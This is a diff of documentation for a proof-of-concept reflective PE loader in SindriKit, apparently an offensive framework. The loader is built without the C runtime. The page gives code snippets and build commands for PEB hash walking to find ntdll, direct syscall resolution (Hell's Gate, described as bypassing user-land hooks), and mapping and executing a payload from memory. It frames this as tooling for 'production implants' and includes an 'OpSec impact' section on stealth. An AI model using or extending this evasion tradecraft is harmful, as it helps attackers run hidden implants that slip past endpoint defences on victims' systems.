@@ -1,58 +1,88 @@
-# Evasive Loader (No-CRT / No-WinAPI)
+# PoC: loader_noCRT_nowinapi
 
-**Path:** `pocs/loader_noCRT_nowinapi`
+**Location:** `pocs/loader_noCRT_nowinapi/`
 
-This Proof-of-Concept demonstrates the ultimate operational profile of SindriKit: a reflective loader completely independent of both high-level Windows APIs and the Microsoft C Runtime (CRT). By combining direct syscalls via Hell's Gate, PEB module walking, and the `/NODEFAULTLIB` compiler flag, this loader achieves a minimal, stealthy footprint ideal for production implants.
+Minimal reflective loader with the Microsoft CRT stripped (`/NODEFAULTLIB`). Demonstrates SindriKit's CRT manifest fallbacks and the smallest viable integration surface for implant-style binaries.
 
-## 1. CRT Independence
+## What it demonstrates
 
-When compiled in Release mode (`SND_ENABLE_DEBUG=OFF`), this PoC invokes strict CRT-stripping flags:
-```cmake
-target_link_options(loader_noCRT_nowinapi PRIVATE
-    /NODEFAULTLIB
-    /ENTRY:main
-)
-```
-Without the CRT, standard functions like `memcpy` or `memset` are unavailable. SindriKit compensates for this by selectively compiling `src/common/crt_manifest.c` in Release builds, providing framework-native intrinsic fallbacks. This ensures the compiled artifact contains no implicit telemetry or standard library dependencies.
+- Release build with `/NODEFAULTLIB` and `/ENTRY:main`
+- PEB hash walk for `ntdll` (`snd_peb_get_module_base_hash`) — no disk read
+- Syscall scan strategy (single resolver, no sort fallback)
+- Mixed profile: `snd_mem_win` + `snd_mod_nt`
+- Hardcoded payload path (edit source before building)
 
-## 2. Global `ntdll.dll` Resolution
+## Walkthrough
 
-Because the PoC operates without Win32 APIs (like `GetModuleHandle`), it must resolve its own dependencies manually. It does this by walking the Process Environment Block (PEB) to locate `ntdll.dll` by its compile-time hash.
+No CLI — edit `file_path` in `main.c` before building.
 
-```c
-PVOID ntdll;
-status = snd_peb_get_module_base_by_hash(SND_HASH_NTDLL_DLL, &ntdll);
-```
-
-Once resolved, it globally registers the `ntdll` base using the modules API, allowing the rest of the framework (like the native memory allocator or module loader) to utilize it implicitly.
+### 1. Bootstrap `ntdll` from PEB
 
 ```c
-snd_set_ntdll(ntdll);
+PVOID ntdll = NULL;
+status = snd_peb_get_module_base_hash(SND_HASH_NTDLL_DLL, &ntdll);
+snd_syscall_set_ntdll(ntdll);
+snd_syscall_strategy_set(snd_syscall_resolve_ssn_scan);
 ```
 
-## 3. Syscall Strategy
-
-The PoC activates the `snd_hell_extract_syscall` strategy. From this point forward, memory allocations and page protections required during the reflective loading process are executed via dynamically resolved syscalls, entirely bypassing user-land hooks in `ntdll.dll`.
+### 2. Configure loader context
 
 ```c
-snd_set_syscall_strategy(snd_hell_extract_syscall);
+const char *file_path = "payload.exe";
+
+snd_ldr_pe_ctx_t ctx = {0};
+ctx.mem_api = &snd_mem_win;
+ctx.mod_api = &snd_mod_nt;
 ```
 
-## 4. Execution
+### 3. Load, prepare, execute
 
-Like the other loaders, the context is populated with the Native APIs (`snd_mem_native`, `snd_mod_native`), and the target payload is loaded, mapped, and executed reflectively from memory.
+```c
+status = snd_disk_buffer_load(file_path, &file_buf);
+ctx.raw_source = &file_buf;
 
-## Building and Running
+status = snd_ldr_pe_prepare_image(&ctx);
+status = snd_ldr_pe_execute_image(&ctx);
+```
 
-To compile this PoC specifically, ensure you are building in Release mode:
+No DLL export FFI (`-e`/`-a`).
+
+### 4. Cleanup
+
+```c
+snd_ldr_pe_detach_image(&ctx);       // no-op unless stage == EXECUTED
+snd_ldr_pe_free_mapped_image(&ctx);
+snd_buffer_free(&file_buf);
+```
+
+## Building
+
+CRT-less mode **replaces** the full PoC set with this target. Debug must be off:
 
 ```bash
-# Debug must be OFF to strip the CRT
-cmake -B build -DSND_BUILD_PAYLOADS=ON -DSND_ENABLE_DEBUG=OFF
+cmake -B build -DSND_CRTLESS=ON -DSND_ENABLE_DEBUG=OFF -DSND_BUILD_PAYLOADS=ON
 cmake --build build --config Release
 ```
 
-Execution:
-```bash
-build\pocs\loader_noCRT_nowinapi\Release\loader_noCRT_nowinapi.exe
+When `SND_CRTLESS=ON`, the engine compiles `src/common/crt_manifest.c` for intrinsic `memcpy`/`memset` fallbacks. PoC CMake adds:
+
+```cmake
+target_link_options(loader_noCRT_nowinapi PRIVATE /NODEFAULTLIB /ENTRY:main)
 ```
+
+> [!WARNING]
+> `SND_BUILD_TESTS=ON` forces `SND_CRTLESS=OFF`. Use a clean build directory when switching modes.
+
+Output: `build/pocs/loader_noCRT_nowinapi/Release/loader_noCRT_nowinapi.exe`
+
+## OpSec impact
+
+- No implicit CRT telemetry or default library imports
+- PEB-only `ntdll` resolution (no KnownDlls, no disk read)
+- Memory still uses Win32 `VirtualAlloc` via `snd_mem_win` — swap to `snd_mem_sys` for full stealth
+
+## See also
+
+- [Building: CRT-less tier](../getting_started/building.md)
+- [Common infrastructure](../common/infrastructure.md)
+- [loader_nowinapi.md](loader_nowinapi.md) — full CLI loader with NT backends
